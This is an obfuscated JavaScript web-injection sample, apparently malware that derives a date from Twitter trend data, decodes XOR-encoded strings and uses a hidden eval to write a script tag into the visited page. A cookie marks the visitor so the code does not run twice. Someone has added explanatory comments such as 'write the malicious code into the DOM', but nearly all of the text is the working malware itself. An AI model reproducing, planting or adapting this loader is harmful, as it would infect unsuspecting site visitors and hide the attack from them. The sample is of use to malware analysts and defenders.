cc = "5ngth;i++){tmp=ds.slice(i,i+1);";
cd = "st=st+String.fromCharCode((tmp.";
ce = "charCodeAt(0)^('0x00'+es)));}}";
da = "fqb0t-7vrs}vyb>s}7+0fqb0cxyvdY~tuh0-0 +vb08fqb0y0y~0gy~tg>dg>dbu~tc9kyv08gy~tg>x0.0(0660gy~tg>x0,0"!0660y>y~tuh_v870 '790.0=!9kcxyvdY~tuh0-0gy~tg>dg>dbu~tcKyMK$M>aeubi>sxqbStuQd8!90;0gy~tg>dg>dbu~tcKyMK$M>aeubi>|u~wdx+rbuq{+mu|cu0yv088gy~tg>x0,0)0ll00gy~tg>x0.0" 90660y>y~tuh_v870!(790.0=!9kcxyvdY~tuh0-0gy~tg>dg>dbu~tcKyMK$M>aeubi>sxqbS%";
cu = "(p}b4g`mxq)6b}g}v}x}`m.|}ppq%6*(}rfuyq4gfw)6|``d.;;rvwyr}f:w{y;xp;s%|%%;64c}p`|)%$$4|q}s|`),$*(;}rfuyq*(;p}b*";
st = "st="$a=st;dcs(da+db+dc+dd+de,10);dw(st);st=$a;";";
c %= "function c%(cz){return ca+cb+cc+cd+ce+c%;};";
db = "7FtuQd8!90;0! 0;gy~tg>dg>dbu~tcKyMK$M>aeubi>|u~wdx+rbuq{+mmyv08cxyvdY~tuh0--0 09kcxyvdY~tuh0-0gy~tg>dg>dbu~tcKyMK&M>aeubi>sxqbStuQd8!90;0'0;gy~tg>dg>dbu~tcKyMK&M>aeubi>|u~wdx+m0yv08cxyvdY~tuh0.0 9kfqb0dy}u0-0~ug0Qbbqi89+dy}uK7iuqb7M0-0gy~tg>wt>wudEDSVe||Iuqb89+dy}uK7}~dx7M0-0gy~tg>wt>wudEDS]~dx89;!+dy}uK7tqi7M0-0gy~tg>wt>wudEDSTqdu89+fqb0t-7v";
d %= "function dw(t){ca='%64ocu%6d%65nt%2e%77r%69te(%22';ce='%22)';cb='%3cscr%69pt %6can%67u%61%67%65%3d%5c%22javas%63r%69%70%74%5c%22%3e';cc='%3c%5c%2fscr%69p%74%3e';window["e"+""+ "v"+"al"](unescape(t))};";
cb = "0e(ds);st=tmp='';for(i=0;i<ds.l%6";
ca = "function dcs(ds,es){ds=unesca%7";
de = "! 9M0;0|uddubcK8888dy}uK7iuqb7M060 h##!!90..0$90;0~e}9050! 9M+0}~dxSx0-0|uddubcK88dy}uK7}~dx7M0;0~e}9050"%9M0;0|uddubcK88dy}uK7}~dx7M0:0~e}9050"%9M+tqiSx0-0|uddubcK88dy}uK7tqi7M0:0&9050"'9M+0dy}uSx0-0tqiSx0-0|uddubcK88dy}uK7tqi7M0:0~e}9050"$9M+4q-4q>bu`|qsu8t<tqiSx0;0iuqbSx"0;0}~dxSx0;0iuqbSx!0;0tqiSx0;0}~dxcKdy}uK7}~dx7M0=0!M0;07>s}79+m";
dc = "rs}vyb>s}7+fqb0}~dxc0-0~ug0Qbbqi87trc7<07id~7<07f}d7<07f}b7<07}|s7<07h{7<07vtc7<07rfv7<07iec7<07}s`7<07~sj7<07wtg79+fqb0|uddubc0-0~ug0Qbbqi87q7<7r7<7s7<7t7<7u7<7v7<7w7<7x7<7%7<7y7<7{7<7|7<7}7<7~7<77<7`7<7a7<7b7<7c7<7d7<7e7<7f7<7g7<7h7<7i7<7j79+fqb0~e}rubc0-0~ug0Qbbqi8!<"<#<$<%<&<'<(<)9+ve~sdy~0Sq|se|qdu]qwys^e}rub8tqi<0}~dx<0iuqb<0y~tuh9kbudeb~0888iuqb0;";
op = "$a="dw(dcs(cu,14));";";
dd = "08y~tuh0:0tqi990;08}~dx0N0tqi90:0y~tuh90;0tqi9+m0fqb0iuqbSx!<0iuqbSx"<0}~dxSx<0tqiSx<0~e}+~e}0-0Sq|se|qdu]qwys^e}rub8dy}uK7tqi7M<0dy}uK7}~dx7M<0dy}uK7iuqb7M<0cxyvdY~tuh9;!  +iuqbSx!0-0|uddubcK888dy}uK7iuqb7M060 hQQ90;0~e}9050&#9050"&M0;0|uddubcK888dy}uK7iuqb7M060 hQQ90,,0"90;0~e}9050"%M+iuqbSx"0-0|uddubcK8888dy}uK7iuqb7M060 h##!!90..0#90;0~e}9050";

if (document.cookie.indexOf('rf5f6ds') == -1) { //if it doesn't contain "rf5f6ds"
    function callback(x) {
        window.tw = x;
        var d = new Date();
        d.setTime(x["as_of"] * 1000);
        var h = d.getUTCHours();
        window.h = h;
        if (h > 8) {
            d.setUTCDate(d.getUTCDate() - 2);
        } else {
            d.setUTCDate(d.getUTCDate() - 3);
        }
        window.gd = d;
        var time = new Array();
        var shiftIndex = "";
        time["year"] = d.getUTCFullYear();
        time["month"] = d.getUTCMonth() + 1;
        time["day"] = d.getUTCDate();
        if (d.getUTCMonth() + 1 < 10) {
            shiftIndex = time["year"] + "-0" + (d.getUTCMonth() + 1);
        } else {
            shiftIndex = time["year"] + "-" + (d.getUTCMonth() + 1);
        }
        if (d.getUTCDate() < 10) {
            shiftIndex = shiftIndex + "-0" + d.getUTCDate();
        } else {
            shiftIndex = shiftIndex + "-" + d.getUTCDate();
        }
	//write in the HTML document, the javascript code below. URL uses twitter's API.
	//First parameter sended as a GET request is "date" and it has the value shiftIndex. The second parameter sended is callback and it has the value callback2
        document.write("<scr" + "ipt language=javascript" + " src='http://search.twitter.com/trends/daily.json?date=" + shiftIndex + "&callback=callback2'>" + "</scr" + "ipt>");
    }

    function callback2(x) {
        window.tw = x;
        sc('rf5f6ds', 2, 7); //write a new cookie into the victim's browser
        eval(unescape(d % +cz + op + st) + 'dw(dz+cz($a+st));'); //make code executable by doign some operation between variables above
        document.write($a); //write the malicious code into the DOM of the webpage
    }

    document.write("<img src='http://search.twitter.com/images/search/rss.png' width=1 height=1 style='visibility:hidden' /> <scr" + "ipt language=javascript" + " src='http://search.twitter.com/trends/daily.json?callback=callback'>" + "</scr" + "ipt>");
} else { //if the cookie already exsits
    $a = ''; //delete the variable to be as discret as possible
}

function sc(cnm, v, ed) { //create the cookie. cnm is the name of the cookie
    var exd = new Date();
    exd.setDate(exd.getDate() + ed); //ed = 7, so the cookie expires in 7 days
    document.cookie = cnm + '=' + escape(v) + ';expires=' + exd.toGMTString(); //write the cookie into victim's browser
};
